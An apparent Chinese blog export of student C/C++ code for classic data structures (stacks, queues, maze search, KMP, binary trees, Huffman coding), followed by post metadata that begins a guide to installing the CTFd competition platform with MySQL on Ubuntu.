(*exp&gt;='0' &amp;&amp; *exp&lt;='9') //判定为数字字符 &#123; postexp[i++]=*exp; exp++; &#125; postexp[i++]='#'; //用#标识一个数值串结束 &#125; &#125; while (!StackEmpty(Optr)) //此时exp扫描完毕,栈不空时循环 &#123; Pop(Optr,e); //出栈元素e postexp[i++]=e; //将e存放到postexp中 &#125; postexp[i]='\\0'; //给postexp表达式添加结束标识 DestroyStack(Optr); //销毁栈 //return postexp;&#125; 后缀表达式求值 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354double compvalue(char *postexp) &#123; double d, a ,b, c, e; SqStack *Opnd; //定义操作数栈 InitStack(Opnd); //初始化操作数栈 while (*postexp!='\\0') //postexp字符串未扫描完时循环 &#123; switch (*postexp) &#123; case '+': //判定为'+'号 Pop(Opnd,a); //出栈元素a Pop(Opnd,b); //出栈元素b c=b+a; //计算c Push(Opnd,c); //将计算结果c进栈 break; case '-': //判定为'-'号 Pop(Opnd,a); //出栈元素a Pop(Opnd,b); //出栈元素b c=b-a; //计算c Push(Opnd,c); //将计算结果c进栈 break; case '*': //判定为'*'号 Pop(Opnd,a); //出栈元素a Pop(Opnd,b); //出栈元素b c=b*a; //计算c Push(Opnd,c); //将计算结果c进栈 break; case '/': //判定为'/'号 Pop(Opnd,a); //出栈元素a Pop(Opnd,b); //出栈元素b if (a!=0) &#123; c=b/a; //计算c Push(Opnd,c); //将计算结果c进栈 break; &#125; else &#123; printf(\"\\n\\t除零错误!\\n\"); exit(0); //异常退出 &#125; break; default: //处理数字字符 d=0; //转换成对应的数值存放到d中 while (*postexp&gt;='0' &amp;&amp; *postexp&lt;='9') &#123; d=10*d+*postexp-'0'; postexp++; &#125; Push(Opnd,d); //将数值d进栈 break; &#125; postexp++; //继续处理其他字符 &#125; GetTop(Opnd,e); //取栈顶元素e DestroyStack(Opnd); //销毁栈 return e; //返回e&#125; 0x3迷宫问题 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include&lt;stdio.h&gt;#define MaxSize 200//1代表无路，0代表有路 int mg[10][10]=&#123; &#123;1,1,1,1,1,1,1,1,1,1&#125;, &#123;1,0,0,1,0,0,0,1,0,1&#125;, &#123;1,0,0,1,0,0,0,1,0,1&#125;, &#123;1,0,0,0,0,1,1,0,0,1&#125;, &#123;1,0,1,1,1,0,0,0,0,1&#125;, &#123;1,0,0,0,1,0,0,0,0,1&#125;, &#123;1,0,1,0,0,0,1,0,0,1&#125;, &#123;1,0,1,1,1,0,1,1,0,1&#125;, &#123;1,1,0,0,0,0,0,0,0,1&#125;, &#123;1,1,1,1,1,1,1,1,1,1&#125;&#125;;typedef struct&#123; int i; //当前方块的行号 int j; //当前方块的列号 int di; //下一个可走的相邻方块的方位号 &#125;Box;typedef struct&#123; Box data[MaxSize]; int top;&#125;StType;bool mgpath(int xi,int yi,int xe,int ye)&#123; int i,j,k,di,find; StType st; st.top=-1; st.top++; st.data[st.top].i=xi; //初始方块进栈 st.data[st.top].j=yi; st.data[st.top].di=-1; mg[xi][yi]=-1; while(st.top&gt;-1)&#123; i=st.data[st.top].i; j=st.data[st.top].j; di=st.data[st.top].di; if(i==xe&amp;&amp;j==ye)&#123; //找到了出口输出路径 printf(\"迷宫的路径如下:\\n\"); for(k=0;k&lt;=st.top;k++)&#123; printf(\"\\t(%d,%d)\",st.data[k].i,st.data[k].j); if((k+1)%5==0) printf(\"\\n\"); &#125; printf(\"\\n\"); return true; &#125; find=0; while(di&lt;4&amp;&amp;find==0)&#123; //找下一个可走的方位 di++; switch(di) &#123; case 0: i=st.data[st.top].i-1;j=st.data[st.top].j;break; case 1: i=st.data[st.top].i;j=st.data[st.top].j-1;break; case 2: i=st.data[st.top].i;j=st.data[st.top].j+1;break; case 3: i=st.data[st.top].i+1;j=st.data[st.top].j;break; &#125; if(mg[i][j]==0) find=1; &#125; if(find==1)&#123; st.data[st.top].di=di; //修改原栈顶元素di的值 st.top++; //下一个可走方块进栈 st.data[st.top].i=i; st.data[st.top].j=j; st.data[st.top].di=-1; mg[i][j]=-1; //避免重复走该方块 &#125; else&#123; //没有路劲可走，则退栈 mg[st.data[st.top].i][st.data[st.top].j]=0; st.top--; &#125; &#125; return false;&#125;int main()&#123; if(!mgpath(1,1,5,5))&#123; printf(\"该迷宫问题没有解\"); &#125; return 0;&#125; 0x2共享栈 0x3 链栈123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;stdio.h&gt;#include &lt;malloc.h&gt;typedef char ElemType;typedef struct linknode&#123; ElemType data; //数据域 struct linknode *next; //指针域&#125; LiStack; //链栈类型定义void InitStack(LiStack *&amp;s)&#123; s=(LiStack *)malloc(sizeof(LiStack)); s-&gt;next=NULL;&#125;void DestroyQueue(LiStack *&amp;s)&#123; LiStack *p=s-&gt;next; while (p!=NULL) &#123; free(s); s=p; p=p-&gt;next; &#125; free(s); //s指向尾结点,释放其空间&#125;int StackLength(LiStack *s)&#123; int i=0; LiStack *p; p=s-&gt;next; while (p!=NULL) &#123; i++; p=p-&gt;next; &#125; return(i);&#125;bool StackEmpty(LiStack *s)&#123; return(s-&gt;next==NULL);&#125;void Push(LiStack *&amp;s,ElemType e)&#123; LiStack *p; p=(LiStack *)malloc(sizeof(LiStack)); p-&gt;data=e; //新建元素e对应的节点*p p-&gt;next=s-&gt;next; //插入*p节点作为开始节点 s-&gt;next=p;&#125;bool Pop(LiStack *&amp;s,ElemType &amp;e)&#123; LiStack *p; if (s-&gt;next==NULL) //栈空的情况 return false; p=s-&gt;next; //p指向开始节点 e=p-&gt;data; s-&gt;next=p-&gt;next; //删除*p节点 free(p); //释放*p节点 return true;&#125;bool GetTop(LiStack *s,ElemType &amp;e)&#123; if (s-&gt;next==NULL) //栈空的情况 return false; e=s-&gt;next-&gt;data; return true;&#125; 队列0x1 顺序队列基本操作 1234567891011121314151617181920212223242526272829303132333435363738#include&lt;stdio.h&gt;#define MaxSize 200#include&lt;iostream&gt;using namespace std;typedef int ElemType;typedef struct &#123; ElemType data[MaxSize]; int front,rear; //队首和队尾指针&#125;Queue;typedef Queue *SqQueue;void InitQueue(SqQueue &amp;q)&#123; q=new Queue; q-&gt;front=q-&gt;rear=-1;&#125;void DestroyQueue(SqQueue &amp;q) //删除队列 &#123; delete q;&#125;bool QueueEmpty(SqQueue q)&#123; return(q-&gt;front==q-&gt;rear);&#125;bool enQueue(SqQueue &amp;q,ElemType e)&#123; if (q-&gt;rear+1==MaxSize) return false; //队满上溢出 q-&gt;rear=q-&gt;rear+1; q-&gt;data[q-&gt;rear]=e; return true;&#125;bool deQueue(SqQueue &amp;q,ElemType &amp;e)&#123; if (q-&gt;front==q-&gt;rear) //队空下溢出 return false; q-&gt;front=q-&gt;front+1; e=q-&gt;data[q-&gt;front]; return true;&#125; 0x2 循环队列123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#include &lt;iostream&gt;#include&lt;queue&gt;#define MaxSize 100using namespace std;typedef char ElemType;typedef struct &#123; ElemType data[MaxSize]; int front,rear; //队首和队尾指针&#125; Queue;typedef Queue *SqQueue;void InitQueue(SqQueue &amp;q)&#123; q=new Queue; q-&gt;front=q-&gt;rear=0;&#125;//销毁队列 void DestroyQueue(SqQueue &amp;q)&#123; delete q;&#125;//判断队列是否为空 bool QueueEmpty(SqQueue q)&#123; return(q-&gt;front==q-&gt;rear);&#125;//进环形队列 bool enQueue(SqQueue &amp;q,ElemType e)&#123; if ((q-&gt;rear+1)%MaxSize==q-&gt;front) //队满上溢出 return false; q-&gt;rear=(q-&gt;rear+1)%MaxSize; q-&gt;data[q-&gt;rear]=e; return true;&#125;//出环形队列 bool deQueue(SqQueue &amp;q,ElemType &amp;e)&#123; if (q-&gt;front==q-&gt;rear) //队空下溢出 return false; q-&gt;front=(q-&gt;front+1)%MaxSize; e=q-&gt;data[q-&gt;front]; return true;&#125;void number1(int n)&#123; int i; ElemType e; &#125;void number(int n)&#123; int i; ElemType e; SqQueue q; InitQueue(q); for(i=1;i&lt;=n;i++) enQueue(q,i); i=1; while(!QueueEmpty(q))&#123; deQueue(q,e); cout&lt;&lt;e&lt;&lt;\" \"; if(!QueueEmpty(q)) &#123; deQueue(q,e); enQueue(q,e); //剩下一个元素不进队 &#125; &#125;&#125; int main() &#123; /*int n; cin&gt;&gt;n; number(n); */ SqQueue Q; InitQueue(Q); char x= 'e', y= 'c'; enQueue(Q, 'h'); enQueue(Q, 'r'); enQueue(Q, y); deQueue(Q, x); enQueue(Q, x); deQueue(Q, x); enQueue(Q, 'a'); while(!QueueEmpty(Q))&#123; deQueue(Q,y); cout&lt;&lt;y; &#125; cout&lt;&lt;x; return 0;&#125; 题目n个人站成一排，从左到右编号分别为1–n，现从左到右报数“1,2,1,2,…”,数到1的人出列，数到“2”的立即站到队伍最右端，报数过程反复进行，直到n个人都出列为止。给出他们的出列顺序C语言 12345678910111213141516void number(int n)&#123; int i; ElemType e; SqQueue q; InitQueue(q); for(i=1;i&lt;=n;i++) enQueue(q,i); i=1; while(!QueueEmpty(q))&#123; deQueue(q,e); cout&lt;&lt;e&lt;&lt;\" \"; if(!QueueEmpty(q)) &#123; deQueue(q,e); enQueue(q,e); //剩下一个元素不进队 &#125; &#125;&#125; c++ 123456789101112131415161718192021222324#include &lt;string&gt; // 使用 string 类时须包含这个文件#include &lt;iostream&gt;#include &lt;queue&gt; //调用c++中的类：queue using namespace std; void number(int n)&#123; int i; queue&lt;int&gt; q1; //初始化队列，包含类型 for(i=1;i&lt;=n;i++)&#123; q1.push(i); //入队列 &#125; while(!q1.empty()) //判断队列是否为空，是返回true; &#123; cout&lt;&lt;q1.front()&lt;&lt;\" \"; //获取队首元素 ；访问队尾元素：q1.back() q1.pop(); if(!q1.empty()) &#123; q1.push(q1.front()); q1.pop(); //出队列，不返回元素 &#125; &#125; &#125;&#125;int main()&#123; number(8);&#125; 打印杨辉三角 1234567891011121314151617181920void triangle(SqQueue &amp;q,int n)&#123; ElemType x,y; InitQueue(q); enQueue(q,0); enQueue(q,1); enQueue(q,0);//处理第一行 cout&lt;&lt;1&lt;&lt;endl; for(int i=2;i&lt;=n;i++) //第二行开始处理 &#123; for(int j = 1; j&lt;= i ; j++)//每行出队入队次数 &#123; deQueue(q,x);//出队 y = GetFront(q); //获得队首元素 enQueue(q,x+y); //前2个元素相加，再入队 cout&lt;&lt;x+y;//输出x+y值； &#125; enQueue(q,0);//入队0 cout&lt;&lt;endl;//输出回车换行； &#125; &#125; 迷宫 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#include&lt;stdio.h&gt;#define MaxSize 200//1代表无路，0代表有路 int mg[10][10]=&#123; &#123;1,1,1,1,1,1,1,1,1,1&#125;, &#123;1,0,0,1,0,0,0,1,0,1&#125;, &#123;1,0,0,1,0,0,0,1,0,1&#125;, &#123;1,0,0,0,0,1,1,0,0,1&#125;, &#123;1,0,1,1,1,0,0,0,0,1&#125;, &#123;1,0,0,0,1,0,0,0,0,1&#125;, &#123;1,0,1,0,0,0,1,0,0,1&#125;, &#123;1,0,1,1,1,0,1,1,0,1&#125;, &#123;1,1,0,0,0,0,0,0,0,1&#125;, &#123;1,1,1,1,1,1,1,1,1,1&#125;&#125;;typedef struct &#123; int i,j; int pre;&#125;Box;typedef struct&#123; Box data[MaxSize]; int front,rear; &#125;QuType;bool mgpath(int xi,int yi,int xe,int ye);void print(QuType qu,int front);bool mgpath(int xi,int yi,int xe,int ye)&#123; int i,j ,find=0,di; QuType qu; qu.front=qu.rear=-1; qu.rear++; //xi,yi进队 qu.data[qu.rear].i=xi; qu.data[qu.rear].j=yi; qu.data[qu.rear].pre=-1; mg[xi][yi]=-1; //将其赋值为-1,以避免回过来重复搜索 while(qu.front!=qu.rear&amp;&amp;!find) &#123; qu.front++; i=qu.data[qu.front].i; j=qu.data[qu.front].j; if(i==xe&amp;&amp;j==ye)&#123; find=1; print(qu,qu.front); return true; &#125; for(di=0;di&lt;4;di++)&#123; switch(di)&#123; case 0: i=qu.data[qu.front].i-1;j=qu.data[qu.front].j;break; case 1: i=qu.data[qu.front].i;j=qu.data[qu.front].j+1;break; case 2: i=qu.data[qu.front].i+1;j=qu.data[qu.front].j;break; case 3: i=qu.data[qu.front].i;j=qu.data[qu.front].j-1;break; &#125; if(mg[i][j]==0) &#123; qu.rear++; qu.data[qu.rear].i=i; qu.data[qu.rear].j=j; qu.data[qu.rear].pre=qu.front;//指向路径中上一个方块的下标 mg[i][j]=-1;//将其赋值-1，以避免回过来重复搜索 &#125; &#125; &#125; return false;&#125; void print(QuType qu,int front)&#123; int k=front,j,ns=0; printf(\"\\n\"); do &#123; j=k; k=qu.data[j].pre; qu.data[j].pre=-1; &#125;while(k!=0); printf(\"迷宫的路径如下:\\n\"); k=0; while(k&lt;MaxSize) &#123; if(qu.data[k].pre==-1) &#123; ns++; printf(\"\\t(%d,%d)\",qu.data[k].i,qu.data[k].j); if(ns%5==0)printf(\"\\n\"); &#125; k++; &#125; printf(\"\\n\");&#125;int main()&#123; if(!mgpath(1,1,5,5)) printf(\"该迷宫问题没有解\"); &#125; 0x3 链表队列123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;iostream&gt;using namspace std;typedef char ElemType;typedef struct qnode&#123; ElemType data; struct qnode *next;&#125; QNode; //链队数据结点类型定义typedef struct&#123; QNode *front; QNode *rear;&#125; Queue;//链队类型定义typedef struct Queue *LiQueue;void InitQueue(LiQueue &amp;q)&#123; q=new Queue; q-&gt;front=q-&gt;rear=NULL;&#125;void DestroyQueue(LiQueue &amp;q)&#123; QNode *p=q-&gt;front,*r; //p指向队头数据节点 if (p!=NULL) //释放数据节点占用空间 &#123; r=p-&gt;next; while (r!=NULL) &#123; delete p; p=r;r=p-&gt;next; &#125; &#125; delete p;delete q; //释放链队节点占用空间&#125;bool QueueEmpty(LiQueue *q)&#123; return(q-&gt;rear==NULL);&#125;void enQueue(LiQueue &amp;q,ElemType e)&#123; QNode *p; p=new QNode ; p-&gt;data=e; p-&gt;next=NULL; if (q-&gt;rear==NULL) //若链队为空,则新节点是队首节点又是队尾节点 q-&gt;front=q-&gt;rear=p; else &#123; q-&gt;rear-&gt;next=p; //将*p节点链到队尾,并将rear指向它 q-&gt;rear=p; &#125;&#125;bool deQueue(LiQueue &amp;q,ElemType &amp;e)&#123; QNode *t; if (q-&gt;rear==NULL) //队列为空 return false; t=q-&gt;front; //t指向第一个数据节点 if (q-&gt;front==q-&gt;rear) //队列中只有一个节点时 q-&gt;front=q-&gt;rear=NULL; else //队列中有多个节点时 q-&gt;front=q-&gt;front-&gt;next; e=t-&gt;data; delete t; return true;&#125; 串串的模式匹配算法Brute-Force算法 12345678910111213141516171819202122232425262728293031323334353637383940#include&lt;stdio.h&gt;#define MaxSize 200typedef struct&#123; char data[MaxSize]; int length;&#125;SqString;strAssign(SqString &amp;s,char cstr[])&#123; int i; for(i=0;cstr[i]!='\\0';i++)&#123; s.data[i]=cstr[i]; &#125; s.length=i;&#125;int index(SqString s,SqString t)&#123; int i=0, j=0; while (i&lt;s.length &amp;&amp; j&lt;t.length) &#123; if (s.data[i]==t.data[j]) //继续匹配下一个字符 &#123; i++; //主串和子串依次匹配下一个字符 j++; &#125; else //主串、子串指针回溯重新开始下一次匹配 &#123; i=i-j+1; //主串从下一个位置开始匹配 j=0; //子串从头开始匹配 &#125; &#125; if (j&gt;=t.length) return(i-t.length); //返回匹配的第一个字符的下标 else return(-1); //模式匹配不成功&#125;int main()&#123; char a[20]=\"aaabcde\",b[20]=\"abcde\"; int i; SqString q,p; strAssign(q,a); strAssign(p,b); i=index(q,p); printf(\"%d\",i); &#125; KMP算法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//Brute-Force算法#include&lt;stdio.h&gt;#define MaxSize 200typedef struct&#123; char data[MaxSize]; int length;&#125;SqString;strAssign(SqString &amp;s,char cstr[])&#123; int i; for(i=0;cstr[i]!='\\0';i++)&#123; s.data[i]=cstr[i]; &#125; s.length=i;&#125;void GetNext(SqString t,int next[]) &#123; int j,k; j=0;k=-1;next[0]=-1; while (j&lt;t.length-1) &#123; if (k==-1 || t.data[j]==t.data[k]) &#123; j++;k++; next[j]=k; &#125; else k=next[k]; &#125;&#125;int KMPIndex(SqString s,SqString t) &#123; int next[MaxSize],i=0,j=0; GetNext(t,next); while (i&lt;s.length &amp;&amp; j&lt;t.length) &#123; if (j==-1 || s.data[i]==t.data[j]) &#123; i++; j++; //i,j各增1 &#125; else j=next[j]; //i不变,j后退 &#125; if (j&gt;=t.length) return(i-t.length); //匹配模式串首字符下标 else return(-1); //返回不匹配标志&#125;int main()&#123; char a[20]=\"aaabaaaab\",b[20]=\"aaaab\"; int next[20]; int i; SqString s,t; strAssign(s,a); strAssign(t,b); i=KMPIndex(s,t); printf(\"%d\",i); &#125; 树0x1 二叉树创建、遍历 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161#include&lt;stdio.h&gt;#include&lt;iostream&gt;using namespace std;#include&lt;queue&gt;typedef char ElemType;#define MaxSize 200typedef struct node&#123; ElemType data; struct node *lchild, *rchild;&#125;BTNode; typedef BTNode *BTree; //创建树 //输入序列:A, B, C, D, F, G, I, 0, 0, E, 0, 0, H, 0, 0, 0, 0, 0, 0void CreateBTree(BTree &amp;BT,string str)&#123; BTree T;int i=0; queue&lt;BTree&gt; Q;//队列 if( str[0]!='0' )&#123; /*分配根结点单元，并将结点地址入队*/ BT =new BTNode; BT-&gt;data = str[0]; BT-&gt;lchild=BT-&gt;rchild=NULL; Q.push(BT); &#125; else BT=NULL; /* 若第1个数据就是0，返回空树 */ while( !Q.empty()) &#123; T = Q.front();/*从队列中取出一结点地址*/ Q.pop(); i++; if(str[i]=='0' ) T-&gt;lchild = NULL; else &#123; /*生成左孩子结点；新结点入队*/ T-&gt;lchild = new BTNode; T-&gt;lchild-&gt;data = str[i]; T-&gt;lchild-&gt;lchild=T-&gt;lchild-&gt;rchild=NULL; Q.push(T-&gt;lchild); &#125; i++; /* 读入T的右孩子 */ if(str[i]=='0') T-&gt;rchild = NULL; else &#123; /*生成右孩子结点；新结点入队*/ T-&gt;rchild = new BTNode;; T-&gt;rchild-&gt;data = str[i]; T-&gt;rchild-&gt;lchild=T-&gt;rchild-&gt;rchild=NULL; Q.push(T-&gt;rchild); &#125; &#125; /* 结束while */&#125;//先序遍历 void PreOrder(BTree bt)&#123; if (bt!=NULL) &#123; printf(\"%c \",bt-&gt;data); //访问根结点 PreOrder(bt-&gt;lchild); PreOrder(bt-&gt;rchild); &#125;&#125;//中序遍历 void InOrder(BTree bt)&#123; if (bt!=NULL) &#123; InOrder(bt-&gt;lchild); printf(\"%c \",bt-&gt;data); //访问根结点 InOrder(bt-&gt;rchild); &#125;&#125; //后序遍历 void PostOrder(BTree bt) &#123; if (bt!=NULL) &#123; PostOrder(bt-&gt;lchild); PostOrder(bt-&gt;rchild); printf(\"%c \",bt-&gt;data); //访问根结点 &#125;&#125;//求所有节点的值 int FindSum(BTree bt)&#123; if(bt==NULL) return 0; else return (bt-&gt;data+FindSum(bt-&gt;lchild) +FindSum(bt-&gt;rchild));&#125;//访问所有的叶子节点 void DispLeaf(BTNode *b)&#123; if (b!=NULL) &#123; if (b-&gt;lchild==NULL &amp;&amp; b-&gt;rchild==NULL) printf(\"%c \",b-&gt;data); //访问叶子结点 DispLeaf(b-&gt;lchild); //输出左子树中的叶子结点 DispLeaf(b-&gt;rchild); //输出右子树中的叶子结点 &#125;&#125;//输出值为x节点所有祖先bool ancestor(BTree bt,ElemType x)&#123; if(bt==NULL) return false; else if(bt-&gt;lchild!=NULL &amp;&amp; bt-&gt;lchild-&gt;data==x || bt-&gt;rchild!=NULL &amp;&amp; bt-&gt;rchild-&gt;data==x) &#123; cout&lt;&lt;bt-&gt;data&lt;&lt;\" \"; //找到孩子为x结点 return true; &#125; else if(ancestor(bt-&gt;lchild,x) || ancestor(bt-&gt;rchild,x))&#123; cout&lt;&lt;bt-&gt;data;//先序遍历 return true; &#125; else return false;&#125;//层次遍历 void LevelOrder(BTree bt)&#123; queue&lt;BTree&gt; q; //初始化队列，元素为树节点 BTree p; //树指针p if(bt!=NULL) q.push(bt); //根节点入队列 while(!q.empty()) &#123; p=q.front(); //访问队头节点 q.pop(); cout&lt;&lt;p-&gt;data&lt;&lt;\" \"; if(p-&gt;lchild) q.push(p-&gt;lchild);//左右孩子入队 if(p-&gt;rchild) q.push(p-&gt;rchild); &#125;&#125; //求高度 int BTNodeHeight(BTNode *b)&#123; int lchildh,rchildh; if(b==NULL) return 0; else&#123; lchildh=BTNodeHeight(b-&gt;lchild); rchildh=BTNodeHeight(b-&gt;rchild); return (lchildh&gt;rchildh)?(lchildh+1):(rchildh+1); &#125; &#125; int main()&#123; char str[100]=&#123;'A','B', 'C','D', 'F', 'G', 'I','0','0','E', '0', '0', 'H', '0', '0', '0', '0', '0', '0'&#125;; char a='E'; int height; BTree BT; CreateBTree(BT,str); cout&lt;&lt;\"先序遍历:\"; PreOrder(BT); cout&lt;&lt;endl; cout&lt;&lt;\"中序遍历:\"; InOrder(BT); cout&lt;&lt;endl; cout&lt;&lt;\"后序遍历:\"; PostOrder(BT); cout&lt;&lt;endl; cout&lt;&lt;\"叶子节点:\"; DispLeaf(BT); cout&lt;&lt;endl; cout&lt;&lt;a&lt;&lt;\"的祖先结点:\"; ancestor(BT,a); cout&lt;&lt;endl; cout&lt;&lt;\"层次遍历:\"; LevelOrder(BT); cout&lt;&lt;endl; cout&lt;&lt;\"高度为:\"; height=BTNodeHeight(BT); cout&lt;&lt;height; &#125; 0x2 二叉树构造、线索二叉树 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#include&lt;stdio.h&gt;#include&lt;iostream&gt;#include&lt;malloc.h&gt; using namespace std;#include&lt;queue&gt;typedef char ElemType;#define MaxSize 200typedef struct node&#123; ElemType data; struct node *lchild, *rchild;&#125;BTNode; typedef BTNode *BTree;//层次遍历 void LevelOrder(BTree bt)&#123; queue&lt;BTree&gt; q; //初始化队列，元素为树节点 BTree p; //树指针p if(bt!=NULL) q.push(bt); //根节点入队列 while(!q.empty()) &#123; p=q.front(); //访问队头节点 q.pop(); cout&lt;&lt;p-&gt;data&lt;&lt;\" \"; if(p-&gt;lchild) q.push(p-&gt;lchild);//左右孩子入队 if(p-&gt;rchild) q.push(p-&gt;rchild); &#125;&#125; //先序中序构造二叉树 BTNode *CreateBT1(char *pre,char *in,int n)&#123; BTNode *s; char *p; int k; if (n&lt;=0) return NULL; s=new BTNode; s-&gt;data=*pre; //创建根节点 for (p=in;p&lt;in+n;p++) //在中序中找为*ppos的位置k if (*p==*pre) break; k=p-in; s-&gt;lchild=CreateBT1(pre+1,in,k); //构造左子树 s-&gt;rchild=CreateBT1(pre+k+1,p+1,n-k-1); //右子树 //右子树 return s;&#125; //中序和后序构造二叉树 BTNode *CreateBT2(char *post,char *in,int n)&#123; BTNode *s; char *p; int k; if (n&lt;=0) return NULL; s=(BTNode *)malloc(sizeof(BTNode));//创建节点 s-&gt;data=*(post+n-1); //构造根节点。 for (p=in;p&lt;in+n;p++)//在中序中找为*ppos的位置k if (*p==*(post+n-1)) break; k=p-in; s-&gt;lchild=CreateBT2(post,in,k); //构造左子树 s-&gt;rchild=CreateBT2(post+k,p+1,n-k-1);//构造右子树 return s;&#125; //ABCD#EF#G######顺序存储结构转成二叉链 有点问题，以后再探索 BTree CreateBTree(string str,int i)&#123; int len; BTree bt; bt=new BTNode; len=str.size(); if(i&gt;len || i&lt;=0) return NULL; if(str[i]=='#') return NULL; bt-&gt;data =str[i]; bt-&gt;lchild =CreateBTree(str,2*i); bt-&gt;rchild =CreateBTree(str,2*i+1); return bt;&#125;int main()&#123; char str[100]=&#123;'A','B', 'C','D', 'F', 'G', 'I','0','0','E', '0', '0', 'H', '0', '0', '0', '0', '0', '0'&#125;; char pre[40]=\"ABDFCEGH\"; char in[40]=\"BFDAGEHC\"; char in1[40]=\"BDCEAFHG\"; char ord[40]=\"DECBHGFA\"; string seq=\"ABCD#EF#G######\"; int height; BTree BT; BTree BT1; BTree BT2; BT=CreateBT1(pre,in,8); LevelOrder(BT); cout&lt;&lt;endl; BT1=CreateBT2(ord,in1,8); LevelOrder(BT1); cout&lt;&lt;endl; BT2=CreateBTree(seq,0); LevelOrder(BT2); &#125; 0x3哈夫曼编码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152typedef struct&#123; char data; //节点值 float weight; //权重 int parent; //双亲节点 int lchild; //左孩子节点 int rchild; //右孩子节点&#125; HTNode; //初始化哈夫曼编码 void CreateHT(HTNode ht[],int n)&#123; int i,j,k,lnode,rnode; float min1,min2; //此处补充叶子节点相关设置 for (i=0;i&lt;2*n-1;i++) //所有节点的相关域置初值-1 ht[i].parent=ht[i].lchild=ht[i].rchild=-1; for (i=n;i&lt;2*n-1;i++) //构造哈夫曼树 &#123; min1=min2=32767; lnode=rnode=-1; for (k=0;k&lt;=i-1;k++) if (ht[k].parent==-1) //未构造二叉树的节点中查找 &#123; if (ht[k].weight&lt;min1) &#123; min2=min1;rnode=lnode; min1=ht[k].weight;lnode=k; &#125; else if (ht[k].weight&lt;min2) &#123; min2=ht[k].weight;rnode=k; &#125; &#125; //if ht[lnode].parent=i;ht[rnode].parent=i; ht[i].weight=ht[lnode].weight+ht[rnode].weight; ht[i].lchild=lnode;ht[i].rchild=rnode; &#125;&#125; typedef struct&#123; char cd[10]; //存放当前节点的哈夫曼码 int start;//哈夫曼码在cd中的起始位置&#125;HCode;//根据哈夫曼树求对应的哈夫曼编码的算法如下：void CreateHCode(HTNode ht[],HCode hcd[],int n)&#123; int i,f,c; HCode hc; for (i=0;i&lt;n;i++) //根据哈夫曼树求哈夫曼编码 &#123; hc.start=n;c=i; f=ht[i].parent; while (f!=-1) //循环直到无双亲节点即到达树根节点 &#123; if (ht[f].lchild==c) //当前节点是左孩子节点 hc.cd[hc.start--]='0'; else //当前节点是双亲节点的右孩子节点 hc.cd[hc.start--]='1'; c=f;f=ht[f].parent; //再对双亲节点进行同样的操作 &#125; hc.start++; //start指向哈夫曼编码最开始字符 hcd[i]=hc; &#125;&#125;","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"c语言","slug":"c语言","permalink":"https://blog.cfyqy.com/tags/c%E8%AF%AD%E8%A8%80/"},{"name":"数据结构","slug":"数据结构","permalink":"https://blog.cfyqy.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}],"author":"ye1s"},{"title":"c语言思维导图","slug":"c语言思维导图","date":"2019-04-07T07:25:00.000Z","updated":"2021-01-05T03:12:45.594Z","comments":true,"path":"article/55e0ef1f.html","link":"","permalink":"https://blog.cfyqy.com/article/55e0ef1f.html","excerpt":"网上搜罗的一张思维导图","text":"网上搜罗的一张思维导图","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"编程语言","slug":"编程语言","permalink":"https://blog.cfyqy.com/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"c语言","slug":"c语言","permalink":"https://blog.cfyqy.com/tags/c%E8%AF%AD%E8%A8%80/"}],"author":"ye1s"},{"title":"ubuntu ctfd平台搭建","slug":"fd平台搭建","date":"2019-03-31T12:19:00.000Z","updated":"2020-04-13T08:13:40.663Z","comments":true,"path":"article/ac0f80f3.html","link":"","permalink":"https://blog.cfyqy.com/article/ac0f80f3.html","excerpt":"最近学校要举办ctf比赛，要搭建一个ctf的平台，ctfd是个不错的选择，是用flask框架写的。","text":"最近学校要举办ctf比赛，要搭建一个ctf的平台，ctfd是个不错的选择，是用flask框架写的。 搭建环境: 12345Ubuntu18.04.2mysql 5.7.25python 2.7.15 Apache 2.4.29 nginx 1.14.0 科学上网(可忽略)ubuntu安装ssr客户端教程 ctfd0x1安装Flask1python2 -m pip install Flask 0x2下载ctfd1git clone https://github.com/CTFd/CTFd.git 0x3安装ctfd123cd CTFd./prepare.sh 0x4连接mysql数据库0x4.1安装mysql 1231. sudo apt install mysql-server2. apt install mysql-client3. sudo apt install libmysqlclient-dev 数据库用户登录和修改问题参考此链接:https://www.jianshu.com/p/161f612a971c0x4.2安装pymysql模块 1python2 -m pip install pymysql 0x4.3在mysql中创建ctf数据库 1mysql&gt; create database ctfd; 修改一下数据库表的编码为utf-8要不后台管理会无法输入中文 123456789101112131415161718USE ctfd;ALTER TABLE alembic_version CONVERT TO CHARACTER SET utf8;ALTER TABLE awards CONVERT TO CHARACTER SET utf8;ALTER TABLE challenges CONVERT TO CHARACTER SET utf8;ALTER TABLE config CONVERT TO CHARACTER SET utf8;ALTER TABLE dynamic_challenge CONVERT TO CHARACTER SET utf8;ALTER TABLE files CONVERT TO CHARACTER SET utf8;ALTER TABLE flags CONVERT TO CHARACTER SET utf8;ALTER TABLE hints CONVERT TO CHARACTER SET utf8;ALTER TABLE notifications CONVERT TO CHARACTER SET utf8;ALTER TABLE pages CONVERT TO CHARACTER SET utf8;ALTER TABLE solves CONVERT TO CHARACTER SET utf8;ALTER TABLE submissions 